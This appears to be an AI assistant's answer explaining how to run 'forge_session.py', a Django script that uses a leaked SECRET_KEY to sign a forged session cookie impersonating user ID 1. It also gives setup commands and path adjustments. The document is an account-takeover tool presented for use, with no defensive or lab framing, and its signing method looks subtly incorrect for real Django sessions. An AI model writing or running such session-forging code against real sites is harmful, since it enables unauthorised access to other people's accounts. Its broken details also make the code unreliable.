To run the script that signs session data, you can place it in any folder that has access to your Django environment and dependencies. Here are the steps to properly run the script:

```bash
python3 -m venv .venv
source .venv/bin/activate

pip install --upgrade pip
pip install django
pip install -r requirements.txt

python3 manage.py runserver
python3 forge_session.py
```

To ensure your script runs correctly from the `impersonate/impersonate` folder within your Django project, you need to adjust the Python path and the `DJANGO_SETTINGS_MODULE` environment variable appropriately.

Here's how you can adapt your script:

### Updated Script: `forge_session.py`

Place the script in the `impersonate/impersonate` folder and modify it as follows:

```python
import os
import sys
import json
import base64
from django.conf import settings
from django.core.signing import Signer

# Determine the project's root directory and add it to the Python path
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))
sys.path.append(project_root)

# Set up Django settings
os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'crudproject.settings')
import django
django.setup()

# The SECRET_KEY from the leaked settings
SECRET_KEY = 'your-leaked-secret-key'

# Sample session data
session_data = {
    '_auth_user_id': '1',  # ID of the user to impersonate
    '_auth_user_backend': 'django.contrib.auth.backends.ModelBackend',
}

# Serialize and sign the session data
session_data_json = json.dumps(session_data)
session_data_encoded = base64.b64encode(session_data_json.encode()).decode()
signer = Signer(key=SECRET_KEY)
signed_session_data = signer.sign(session_data_encoded)

print(f'Session Cookie: {signed_session_data}')
```

### Explanation

1. **Determine Project Root and Add to Python Path**:
   - `project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '../../'))` calculates the absolute path to the root of the project by navigating two levels up from the current script's directory.
   - `sys.path.append(project_root)` adds the project root directory to the Python path, ensuring that Python can locate the `crudproject` module.

2. **Set the Environment Variable**:
   - `os.environ.setdefault('DJANGO_SETTINGS_MODULE', 'crudproject.settings')` sets the `DJANGO_SETTINGS_MODULE` environment variable to point to your project's settings module.

3. **Initialize Django**:
   - `import django` and `django.setup()` initialize Django. This ensures that settings are properly loaded and available.

### Directory Structure for Reference

Here's the relevant part of your project structure:

```
my_django_project/
├── README.md
├── crudapp/
│   ├── __init__.py
│   ├── __pycache__/
│   ├── admin.py
│   ├── apps.py
│   ├── forms.py
│   ├── management/
│   │   └── commands/
│   │       ├── __init__.py
│   │       └── impersonate_user.py
│   ├── migrations/
│   │   ├── 0001_initial.py
│   │   ├── __init__.py
│   ├── models.py
│   ├── templates/
│   ├── tests.py
│   ├── urls.py
│   └── views.py
├── crudproject/
│   ├── __init__.py
│   ├── __pycache__/
│   ├── asgi.py
│   ├── manage.py
│   ├── settings.py
│   ├── static/
│   ├── urls.py
│   └── wsgi.py
├── db.sqlite3
├── impersonate/
│   ├── impersonate/
│   │   └── forge_session.py  # <- Place your script here
└── manage.py
└── media/
└── requirements.txt
```

### Running the Script

1. **Activate Virtual Environment** (if you are using one):
   ```bash
   source path/to/your/virtualenv/bin/activate
   ```

2. **Navigate to the `impersonate/impersonate` Directory**:
   ```bash
   cd /path/to/your/project/impersonate/impersonate
   ```

3. **Run the Script**:
   ```bash
   python forge_session.py
   ```

### Summary

By adding the project root directory to the Python path and setting the correct environment variable, you ensure that Django can find and load your settings. This setup allows your script to run within the context of your Django project with all necessary configurations.
